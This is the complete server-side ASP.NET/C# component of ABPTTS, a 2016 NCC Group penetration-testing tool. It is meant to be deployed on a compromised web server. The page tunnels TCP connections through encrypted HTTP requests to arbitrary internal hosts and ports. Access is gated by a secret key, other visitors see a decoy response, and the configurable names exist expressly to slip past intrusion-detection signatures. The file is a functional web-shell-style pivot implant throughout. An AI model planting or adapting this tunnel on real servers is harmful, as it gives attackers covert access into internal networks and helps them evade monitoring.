<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">

/*

	This file is part of A Black Path Toward The Sun ("ABPTTS")

	Copyright 2016 NCC Group

	A Black Path Toward The Sun ("ABPTTS") is free software: you can redistribute it and/or modify
	it under the terms of version 2 of the GNU General Public License as published by
	the Free Software Foundation.

	A Black Path Toward The Sun ("ABPTTS") is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with A Black Path Toward The Sun ("ABPTTS") (in the file license.txt).
	If not, see <http://www.gnu.org/licenses/>.

	Version 1.0
	Ben Lincoln, NCC Group
	2016-07-30

	A Black Path Toward The Sun server component template file (ASP.NET / C#)
	
	Tested successfully on:
		
		IIS
			6.0 (.NET 2.0.50727 / Windows Server 2003 R2 SP2 / x86-64 / VirtualBox)

			6.0 (.NET 2.0.50727 / Windows Server 2003 R2 SP2 / x86-64 / VMWare Fusion)
			
			7.5 (.NET 2.0.50727 / Windows 7 / x86-64 / Physical Workstation)
			
			7.5 (.NET 4.0.30319 / Windows 7 / x86-64 / Physical Workstation)

		Apache httpd with Mono
			httpd 2.2.22 (.NET 4.0.30319 / Ubuntu 12.04.2 /x86-64 / VirtualBox) [ ~3x faster tunneled SSH than IIS on Windows 7 x64! -Ben ]
			
			httpd 2.4.10 (.NET 4.0.30319 / Debian 8 / x86-64 / VMWare Fusion)
			
		ASP.NET Development Server
			10.0.0.0 (.NET 4.0.30319 / Windows 7 / x86-64 / Physical Workstation)
			
*/


public class SessionConnection
{
    public string ConnectionID;
    public int PortNumber;
    public string Host;
    public Socket Sock;
    public int UnusedIterations;
    public byte[] ReceiveBuffer;
    protected static Object sessionConnectionLockObject = new Object();

	public SessionConnection()
	{
        ConnectionID = GenerateConnectionID();
        PortNumber = -1;
        Host = "";
        UnusedIterations = 0;
        ReceiveBuffer = new byte[0];
	}

    public void AddBytesToReceiveBuffer(byte[] newBytes)
    {
        if (newBytes.Length > 0)
        {
            // might need to backport this to JSP
            lock (sessionConnectionLockObject)
            {
                byte[] newReceiveBuffer = new byte[ReceiveBuffer.Length + newBytes.Length];
                Array.Copy(ReceiveBuffer, 0, newReceiveBuffer, 0, ReceiveBuffer.Length);
                Array.Copy(newBytes, 0, newReceiveBuffer, ReceiveBuffer.Length, newBytes.Length);
                ReceiveBuffer = newReceiveBuffer;
            }
        }
    }

    public void InitializeSocket(bool useIPV6, string DestHost, int DestPort, int serverSocketIOTimeout, int serverSocketSendBufferSize, int serverSocketReceiveBufferSize)
    {
        if (useIPV6)
        {
            Sock = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
        }
        else
        {
            Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }
        Sock.SendBufferSize = serverSocketSendBufferSize;
        Sock.SendTimeout = serverSocketIOTimeout;
        Sock.ReceiveBufferSize = serverSocketReceiveBufferSize;
        Sock.ReceiveTimeout = serverSocketIOTimeout;
        Sock.Connect(DestHost, DestPort);
        //Sock.NoDelay = true;
    }

    public byte[] GetBytesFromReceiveBuffer(int maxBytes)
    {
        byte[] result = new byte[0];
        // might need to backport this to JSP
        lock (sessionConnectionLockObject)
        {
            int byteCount = maxBytes;
            if (byteCount > ReceiveBuffer.Length)
            {
                byteCount = ReceiveBuffer.Length;
            }
            result = new byte[byteCount];

            Array.Copy(ReceiveBuffer, 0, result, 0, byteCount);

            if (byteCount == ReceiveBuffer.Length)
            {
                ReceiveBuffer = new byte[0];
            }
            else
            {
                int newByteCount = ReceiveBuffer.Length - byteCount;
                byte[] newReceiveBuffer = new byte[newByteCount];
                Array.Copy(ReceiveBuffer, byteCount, newReceiveBuffer, 0, newByteCount);
                ReceiveBuffer = newReceiveBuffer;
            }
        }
        return result;
    }

    public string GenerateConnectionID()
    {
        Random r = new Random();

        byte[] connID = new byte[8];

        r.NextBytes(connID);

        // http://stackoverflow.com/questions/311165/how-do-you-convert-byte-array-to-hexadecimal-string-and-vice-versa

        return BitConverter.ToString(connID).Replace("-","");
    }
}

/* Begin configurable options */

protected bool useIPV6ClientSocketOnServer = bool.Parse("%PLACEHOLDER_useIPV6ClientSocketOnServer%");

protected const int serverSocketMaxUnusedIterations = %PLACEHOLDER_serverSocketMaxUnusedIterations%;

protected const int serverSocketIOTimeout = %PLACEHOLDER_serverSocketIOTimeout%;
protected const int serverSocketSendBufferSize = %PLACEHOLDER_serverSocketSendBufferSize%;
protected const int serverSocketReceiveBufferSize = %PLACEHOLDER_serverSocketReceiveBufferSize%;

protected const int serverToClientBlockSize = %PLACEHOLDER_serverToClientBlockSize%;

/* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
/* If they are altered, be sure to pass the corresponding alternate values to the Python client software */

protected const string headerValueKey = "%PLACEHOLDER_headerValueKey%";
protected const string encryptionKeyHex = "%PLACEHOLDER_encryptionKeyHex%";

protected const string headerNameKey = "%PLACEHOLDER_headerNameKey%";

protected const string accessKeyMode = "%PLACEHOLDER_accessKeyMode%";
protected const string paramNameAccessKey = "%PLACEHOLDER_paramNameAccessKey%";

protected const string paramNameOperation = "%PLACEHOLDER_paramNameOperation%";
protected const string paramNameDestinationHost = "%PLACEHOLDER_paramNameDestinationHost%";
protected const string paramNameDestinationPort = "%PLACEHOLDER_paramNameDestinationPort%";
protected const string paramNameConnectionID = "%PLACEHOLDER_paramNameConnectionID%";
protected const string paramNameData = "%PLACEHOLDER_paramNameData%";
protected const string paramNamePlaintextBlock = "%PLACEHOLDER_paramNamePlaintextBlock%";
protected const string paramNameEncryptedBlock = "%PLACEHOLDER_paramNameEncryptedBlock%";

protected const string dataBlockNameValueSeparatorB64 = "%PLACEHOLDER_dataBlockNameValueSeparatorB64%";
protected const string dataBlockParamSeparatorB64 = "%PLACEHOLDER_dataBlockParamSeparatorB64%";

protected const string opModeStringOpenConnection = "%PLACEHOLDER_opModeStringOpenConnection%";
protected const string opModeStringSendReceive = "%PLACEHOLDER_opModeStringSendReceive%";
protected const string opModeStringCloseConnection = "%PLACEHOLDER_opModeStringCloseConnection%";

protected const string responseStringHide = "%PLACEHOLDER_responseStringHide%";
protected const string responseStringConnectionCreated = "%PLACEHOLDER_responseStringConnectionCreated%";
protected const string responseStringConnectionClosed = "%PLACEHOLDER_responseStringConnectionClosed%";
protected const string responseStringData = "%PLACEHOLDER_responseStringData%";
protected const string responseStringNoData = "%PLACEHOLDER_responseStringNoData%";
protected const string responseStringErrorGeneric = "%PLACEHOLDER_responseStringErrorGeneric%";
protected const string responseStringErrorInvalidRequest = "%PLACEHOLDER_responseStringErrorInvalidRequest%";
protected const string responseStringErrorConnectionNotFound = "%PLACEHOLDER_responseStringErrorConnectionNotFound%";
protected const string responseStringErrorConnectionOpenFailed = "%PLACEHOLDER_responseStringErrorConnectionOpenFailed%";
protected const string responseStringErrorConnectionCloseFailed = "%PLACEHOLDER_responseStringErrorConnectionCloseFailed%";
protected const string responseStringErrorConnectionSendFailed = "%PLACEHOLDER_responseStringErrorConnectionSendFailed%";
protected const string responseStringErrorConnectionReceiveFailed = "%PLACEHOLDER_responseStringErrorConnectionReceiveFailed%";
protected const string responseStringErrorDecryptFailed = "%PLACEHOLDER_responseStringErrorDecryptFailed%";
protected const string responseStringErrorEncryptFailed = "%PLACEHOLDER_responseStringErrorEncryptFailed%";
protected const string responseStringErrorEncryptionNotSupported = "%PLACEHOLDER_responseStringErrorEncryptionNotSupported%";
protected const string responseStringPrefixB64 = "%PLACEHOLDER_responseStringPrefixB64%";
protected const string responseStringSuffixB64 = "%PLACEHOLDER_responseStringSuffixB64%";


/* End configurable options */

protected string responseStringPrefix = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(responseStringPrefixB64));
protected string responseStringSuffix = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(responseStringSuffixB64));

protected string dataBlockNameValueSeparator = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(dataBlockNameValueSeparatorB64));
protected string dataBlockParamSeparator = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(dataBlockParamSeparatorB64));

protected const int OPMODE_HIDE = 0;
protected const int OPMODE_DEFAULT = 1;
protected const int OPMODE_OPEN = 2;
protected const int OPMODE_SEND_RECEIVE = 4;
protected const int OPMODE_CLOSE = 8;
/* To do: file upload/download, OS command execution */
protected const int OPMODE_UPLOAD = 16;
protected const int OPMODE_DOWNLOAD = 32;
protected const int OPMODE_CMD_EXEC = 64;

protected const int encryptionBlockSize = 16;

protected static Object pageLockObject = new Object();

protected void Page_Load(object sender, EventArgs e)
{
    int opMode = OPMODE_HIDE;

    byte[] encryptionKey = new byte[] {};

    try
    {
	    encryptionKey = hexStringToByteArray(encryptionKeyHex);
    }
    catch (Exception ex)
    {
	    encryptionKey = new byte[] {};
    }

    try
    {
		if (accessKeyMode == "header")
		{
			if ((Request.Headers[headerNameKey] != null) && (Request.Headers[headerNameKey].Trim() == headerValueKey.Trim()))
			{
				opMode = OPMODE_DEFAULT;
			}
		}
		else
		{
			if ((Request.Params[paramNameAccessKey] != null) && (Request.Params[paramNameAccessKey].Trim() == headerValueKey.Trim()))
			{
				opMode = OPMODE_DEFAULT;
			}
		}
    }
    catch (Exception ex)
    {
        opMode = OPMODE_HIDE;
    }

    Response.Write(responseStringPrefix);

    if (opMode == OPMODE_HIDE)
    {
	    Response.Write(responseStringHide);
    }

    if (opMode != OPMODE_HIDE)
    {
	    int DestPort = -1;
	    String RequestedOp = "";
	    String DestHost = "";
	    String DataB64 = "";
	    String ConnectionID = "";
	    Hashtable Connections = new Hashtable();
	    SessionConnection Conn = new SessionConnection();
	    bool encryptedRequest = false;
	    String unpackedBlock = "";
	    Hashtable unpackedParams = new Hashtable();
	    bool sentResponse = false;
	
	    bool validRequest = true;
	
	    try
	    {
		    if ((Request.Params[paramNameEncryptedBlock] != null) || (Request.Params[paramNamePlaintextBlock] != null))
		    {
			    byte[] decodedBytes = new byte[0];
			    if ((Request.Params[paramNameEncryptedBlock] != null) && (encryptionKey.Length > 0))
			    {
				    decodedBytes = Convert.FromBase64String(Request.Params[paramNameEncryptedBlock]);
				    try
				    {
					    byte[] decryptedBytes = DecryptData(decodedBytes, encryptionKey, encryptionBlockSize);
                        unpackedBlock = System.Text.Encoding.UTF8.GetString(decryptedBytes);
                        encryptedRequest = true;
				    }
				    catch (Exception ex)
				    {
                        Response.Write(responseStringErrorDecryptFailed);
					    /* return; */
					    validRequest = false;
					    sentResponse = true;
				    }
			    }
			    else
			    {
				    decodedBytes = Convert.FromBase64String(Request.Params[paramNamePlaintextBlock]);
				    unpackedBlock = System.Text.Encoding.UTF8.GetString(decodedBytes);
			    }
			
			    if (validRequest)
			    {
				    String[] paramArray = unpackedBlock.Split(new string[] { dataBlockParamSeparator }, StringSplitOptions.None);
				    if (paramArray.Length > 0)
				    {
					    for (int i = 0; i < paramArray.Length; i++)
					    {
						    String currentParam = paramArray[i];
						    String[] pvArray = currentParam.Split(new string[] { dataBlockNameValueSeparator }, StringSplitOptions.None);
						    if (pvArray.Length > 1)
						    {
							    unpackedParams.Add(pvArray[0], pvArray[1]);
						    }
					    }
				    }
			    }
		    }
	    }
	    catch (Exception ex)
	    {
		    validRequest = false;
	    }
	
	    if (validRequest)
	    {		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameOperation))
			    {
				    RequestedOp = (String)unpackedParams[paramNameOperation];
			    }
		    }
		    catch (Exception ex)
		    {
			    RequestedOp = "";
		    }
		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameDestinationHost))
			    {
				    DestHost = (String)unpackedParams[paramNameDestinationHost];
			    }
		    }
		    catch (Exception ex)
		    {
			    DestHost = "";
		    }

		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameConnectionID))
			    {
				    ConnectionID = (String)unpackedParams[paramNameConnectionID];
			    }
		    }
		    catch (Exception ex)
		    {
			    ConnectionID = "";
		    }
		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameDestinationPort))
			    {
				    DestPort = int.Parse((String)unpackedParams[paramNameDestinationPort]);
			    }
		    }
		    catch (Exception ex)
		    {
			    DestPort = -1;
		    }
		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameData))
			    {
				    DataB64 = (String)unpackedParams[paramNameData];
			    }
		    }
		    catch (Exception ex)
		    {
			    DataB64 = "";
		    }
		
		    if (RequestedOp == "")
		    {
			    validRequest = false;
		    }
	    }
	
	    if (validRequest)
	    {
		    if (RequestedOp == opModeStringOpenConnection)
		    {
			    opMode = OPMODE_OPEN;
			    if (DestHost == "")
			    {
				    validRequest = false;
			    }
			    if (DestPort == -1)
			    {
				    validRequest = false;
			    }
		    }
		    if (RequestedOp == opModeStringSendReceive)
		    {
			    opMode = OPMODE_SEND_RECEIVE;
                if (ConnectionID == "")
                {
                    validRequest = false;
                }
		    }
		    if (RequestedOp == opModeStringCloseConnection)
		    {
			    opMode = OPMODE_CLOSE;
			    if (ConnectionID == "")
			    {
				    validRequest = false;
			    }
		    }
	    }
	
	    if (!validRequest)
	    {
		    if (!sentResponse)
		    {
			    Response.Write(responseStringErrorInvalidRequest);
                // might need to backport this to the JSP version
                sentResponse = true;
			    /* return; */
		    }
	    }
	    else
	    {
		    try
		    {
			    Connections = (Hashtable)Session["SessionConnections"];
			    if (Connections == null)
			    {
				    Connections = new Hashtable();
			    }
		    }
		    catch (Exception ex)
		    {
			    Connections = new Hashtable();
		    }
		
		    if (opMode == OPMODE_OPEN)
		    {
			    Conn = new SessionConnection();
			    Conn.Host = DestHost;
			    Conn.PortNumber = DestPort;
			    ConnectionID = Conn.ConnectionID;
			    try
			    {
                    Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
				    Connections.Add(ConnectionID, Conn);
                    Response.Write(responseStringConnectionCreated + " " + ConnectionID);
				    sentResponse = true;
			    }
			    catch (Exception ex)
			    {
				    Response.Write(responseStringErrorConnectionOpenFailed);
				    /* return; */
				    validRequest = false;
				    sentResponse = true;
			    }
		    }
	    }
	
	    if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE))
	    {
		    if (Connections.ContainsKey(ConnectionID))
		    {
			    try
			    {
				    Conn = (SessionConnection)Connections[ConnectionID];
				    if (Conn.Sock == null)
				    {
					    validRequest = false;
					    Connections.Remove(ConnectionID);
				    }
			    }
			    catch (Exception ex)
			    {
				    validRequest = false;
			    }
		    }
		    else
		    {
			    validRequest = false;
		    }
		
		    if (!validRequest)
		    {
			    if (!sentResponse)
			    {
				    Response.Write(responseStringErrorConnectionNotFound);
				    /* return; */
				    validRequest = false;
				    sentResponse = true;
			    }
		    }
	    }

	    if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE))
	    {
            if (Conn != null)
            {
                if (!Conn.Sock.Connected)
                {
                    DestHost = Conn.Host;
                    DestPort = Conn.PortNumber;
                    Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
                }
            }	

            //NetworkStream netStream = null;
            //try
            //{
            //    netStream = Conn.TCPClient.GetStream();
            //}
            //catch (Exception ex)
            //{
            //    // need to backport this to the JSP version
            //    if (Conn != null)
            //    {
            //        if (!Conn.Sock.Connected)
            //        {
            //            DestHost = Conn.Host;
            //            DestPort = Conn.PortNumber;
            //            Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
            //        }
            //    }			        
            //}
            //BinaryReader netInReader = new BinaryReader(netStream);
            //BinaryWriter netOutWriter = new BinaryWriter(netStream);

		    byte[] bytesOut = Convert.FromBase64String(DataB64);
		
		    bool socketStillOpen = true;
		
		    try
		    {
			    //netOutWriter.Write(bytesOut);
                //netStream.Write(bytesOut, 0, bytesOut.Length);
                Conn.Sock.Send(bytesOut);
                //netOutWriter.Close();
			    //netOutWriter.Flush();
		    }
		    catch (Exception ex)
		    {
			    socketStillOpen = false;
			    opMode = OPMODE_CLOSE;
		    }

            //if (!Conn.TCPClient.Connected)
            //{
            //    socketStillOpen = false;
            //}
		
		    byte[] bytesIn = new byte[0];

            if (socketStillOpen)
            {
                byte[] buf = new byte[6553600];
                int maxReadAttempts = 65536000;
                //maxReadAttempts = 1000;
                //maxReadAttempts = 500;
                maxReadAttempts = 200;
                int readAttempts = 0;
                int nRead = 0;
                bool doneReading = false;
                try
                {
                    //nRead = netInReader.Read(buf, 0, buf.Length);
                    //nRead = netInReader.Read(buf, 0, Conn.TCPClient.Available);
                    //nRead = netStream.Read(buf, 0, Conn.TCPClient.Available);
                    // this works: if (Conn.Sock.Poll(serverSocketIOTimeout * 1000, SelectMode.SelectRead))
                    if (Conn.Sock.Poll(serverSocketIOTimeout * 100, SelectMode.SelectRead))
                    {
                        nRead = Conn.Sock.Receive(buf);
                    }
                    else
                    {
                        nRead = -1;
                    }
                    if (nRead < 0)
                    {
                        doneReading = true;
                    }
                }
                catch (Exception ex)
                {
                    doneReading = true;
                    // may need to backport this to the JSP version
                    //nRead = -1;
                    //socketStillOpen = false;
                    //opMode = OPMODE_CLOSE;
                }
                while (!doneReading)
                {
                    if (nRead > 0)
                    {
                        byte[] newBytesIn = new byte[bytesIn.Length + nRead];
                        if (bytesIn.Length > 0)
                        {
                            Array.Copy(bytesIn, 0, newBytesIn, 0, bytesIn.Length);
                        }
                        Array.Copy(buf, 0, newBytesIn, bytesIn.Length, nRead);
                        bytesIn = newBytesIn;
                    }
                    //if (nRead > 0)
                    //{
                    //    Array.Copy(buf, 0, newBytesIn, bytesIn.Length, nRead);
                    //    bytesIn = newBytesIn;
                    //}

                    try
                    {
                        //nRead = netInReader.Read(buf, 0, buf.Length);
                        //nRead = netInReader.Read(buf, 0, Conn.TCPClient.Available);
                        //nRead = netStream.Read(buf, 0, Conn.TCPClient.ReceiveBufferSize);
                        if (Conn.Sock.Poll(serverSocketIOTimeout, SelectMode.SelectRead))
                        {
                            nRead = Conn.Sock.Receive(buf);
                        }
                        else
                        {
                            if (Conn.Sock.Connected)
                            {
                                nRead = 0;
                            }
                            else
                            {
                                nRead = -1;
                            }
                        }
                        if (nRead < 0)
                        {
                            doneReading = true;
                        }
                    }
                    catch (Exception ex)
                    {
                        doneReading = true;
                        //nRead = -1;
                        //socketStillOpen = false;
                        //opMode = OPMODE_CLOSE;
                    }
                    readAttempts++;
                    if (readAttempts > maxReadAttempts)
                    {
                        doneReading = true;
                    }
                    //if (!Conn.Sock.Connected)
                    //{
                    //    doneReading = true;
                    //    socketStillOpen = false;
                    //    //opMode = OPMODE_CLOSE;
                    //}
                }

                // might need to backport this to JSP
                lock (pageLockObject)
                {
                    Conn.AddBytesToReceiveBuffer(bytesIn);
                }
            }

            //netStream.Close();
		
		    if (Conn.ReceiveBuffer.Length > 0)
		    {
			    String OutB64 = "";
                // might need to backport this to JSP
                byte[] toClient = new byte[0];
                lock (pageLockObject)
                {
                    toClient = Conn.GetBytesFromReceiveBuffer(serverToClientBlockSize);
                }
			    if (encryptedRequest)
			    {
				    try
				    {
					    byte[] encryptedBytes = EncryptData(toClient, encryptionKey, encryptionBlockSize);
					    OutB64 = Convert.ToBase64String(encryptedBytes);
				    }
				    catch (Exception ex)
				    {
					    Response.Write(responseStringErrorEncryptFailed);
					    /* return; */
					    validRequest = false;
					    sentResponse = true;
				    }
			    }
			    else
			    {
				    OutB64 = Convert.ToBase64String(toClient);
			    }
			    if (!sentResponse)
			    {
                    Response.Write(responseStringData + " " + OutB64);
				    sentResponse = true;
			    }
		    }
		    else
		    {
			    if (!sentResponse)
			    {
                    Response.Write(responseStringNoData);
				    sentResponse = true;
			    }
		    }
	    }
	
	    if ((validRequest) && (opMode == OPMODE_CLOSE))
	    {
		    try
		    {
			    Conn.Sock.Close();
			    if (!sentResponse)
			    {
                    Response.Write(responseStringConnectionClosed + " " + ConnectionID);
				    sentResponse = true;
			    }
		    }
		    catch (Exception ex)
		    {
			    if (!sentResponse)
			    {
				    Response.Write(responseStringErrorConnectionCloseFailed);
				    sentResponse = true;
			    }
		    }
	    }
	
	    if (validRequest)
	    {	
		    lock(pageLockObject)
		    {
			    try
			    {
				    Connections = (Hashtable)Session["SessionConnections"];
				    if (Connections == null)
				    {
					    Connections = new Hashtable();
				    }
			    }
			    catch (Exception ex)
			    {
				    Connections = new Hashtable();
			    }
			
			    /* Update the current connection (if one exists), and remove stale connections */
			
			    if (ConnectionID != "")
			    {
				    Conn.UnusedIterations = 0;
				    if (Connections.ContainsKey(ConnectionID))
				    {
					    Connections.Remove(ConnectionID);
					    if (opMode != OPMODE_CLOSE)
					    {
                            if (Conn.Sock.Connected)
                            {
                                Connections.Add(ConnectionID, Conn);
                            }
					    }
				    }
				    else
				    {
					    Connections.Add(ConnectionID, Conn);
				    }
			    }
			
			    foreach (string cid in Connections.Keys)
			    {
				    if (cid != ConnectionID)
				    {
					    SessionConnection c = (SessionConnection)Connections[cid];
					    Connections.Remove(cid);
					    c.UnusedIterations++;
					    if (c.UnusedIterations < serverSocketMaxUnusedIterations)
					    {
						    Connections.Add(cid, c);
					    }
					    else
					    {
						    try
						    {
							    c.Sock.Close();
						    }
						    catch (Exception ex)
						    {
							    // do nothing
						    }
					    }
				    }
			    }
			
			    Session["SessionConnections"] = Connections;
		    }
	    }
    }

    Response.Write(responseStringSuffix);

}

// http://stackoverflow.com/questions/311165/how-do-you-convert-byte-array-to-hexadecimal-string-and-vice-versa
public byte[] hexStringToByteArray(string hex)
{
    int NumberChars = hex.Length;
    byte[] bytes = new byte[NumberChars / 2];
    for (int i = 0; i < NumberChars; i += 2)
    {
        bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
    }
    return bytes;
}

public byte[] GenerateRandomBytes(int byteCount)
{
    byte[] result = new byte[byteCount];
    new Random().NextBytes(result);
    return result;
}

// http://stackoverflow.com/questions/273452/using-aes-encryption-in-c-sharp
public byte[] EncryptData(byte[] plainText, byte[] key, int blockSize)
{
	byte[] iv = GenerateRandomBytes(blockSize);
	// typical AES encryption depends on the IV alone preventing identical inputs from 
	// encrypting to identical outputs
	// MIT Kerberos uses a model in which the IV is set to all zeroes, but the first 
	// block of data is random, and then discarded on decryption
	// I think of this as a "reinitialization vector" that takes place on the other 
	// side of the encryption "looking glass". It should also help protect against 
	// theoretical known-plaintext vulnerabilities in AES.
	// why not use both? 
	byte[] reIV = GenerateRandomBytes(blockSize);
    RijndaelManaged rijn = new RijndaelManaged();
    rijn.BlockSize = encryptionBlockSize * 8;
    rijn.Key = key;
    rijn.IV = iv;
    rijn.Mode = CipherMode.CBC;
    rijn.Padding = PaddingMode.PKCS7;

    //ICryptoTransform encryptor = rijn.CreateEncryptor(rijn.Key, rijn.IV);
    ICryptoTransform encryptor = rijn.CreateEncryptor();

	byte[] rivPlainText = new byte[plainText.Length + blockSize];
    Array.Copy(reIV, 0, rivPlainText, 0, blockSize);
	Array.Copy(plainText, 0, rivPlainText, blockSize, plainText.Length);
    byte[] cipherText = encryptor.TransformFinalBlock(rivPlainText, 0, rivPlainText.Length);

	byte[] ivCipherText = new byte[cipherText.Length + blockSize];
    Array.Copy(iv, 0, ivCipherText, 0, blockSize);
    Array.Copy(cipherText, 0, ivCipherText, blockSize, cipherText.Length);
	return ivCipherText;
}

public byte[] DecryptData(byte[] cipherText, byte[] key, int blockSize)
{
    byte[] iv = new byte[blockSize];
    byte[] strippedCipherText = new byte[cipherText.Length - blockSize];

    RijndaelManaged rijn = new RijndaelManaged();
    rijn.BlockSize = encryptionBlockSize * 8;
    rijn.Key = key;
    rijn.IV = iv;
    rijn.Mode = CipherMode.CBC;
    rijn.Padding = PaddingMode.PKCS7;

    Array.Copy(cipherText, 0, iv, 0, blockSize);
    Array.Copy(cipherText, blockSize, strippedCipherText, 0, strippedCipherText.Length);

    //ICryptoTransform decryptor = rijn.CreateDecryptor(rijn.Key, rijn.IV);
    ICryptoTransform decryptor = rijn.CreateDecryptor();
    byte[] rivPlainText = decryptor.TransformFinalBlock(strippedCipherText, 0, strippedCipherText.Length);

    byte[] plainText = new byte[rivPlainText.Length - blockSize];
    Array.Copy(rivPlainText, blockSize, plainText, 0, plainText.Length);
    return plainText;
}

// http://stackoverflow.com/questions/8613187/an-elegant-way-to-consume-all-bytes-of-a-binaryreader
public byte[] ReadAllBytes(BinaryReader reader)
{
    const int bufferSize = 4096;
    using (MemoryStream ms = new MemoryStream())
    {
        byte[] buffer = new byte[bufferSize];
        int count;
        while ((count = reader.Read(buffer, 0, buffer.Length)) != 0)
        {
            ms.Write(buffer, 0, count);
        }
        return ms.ToArray();
    }

}

</script>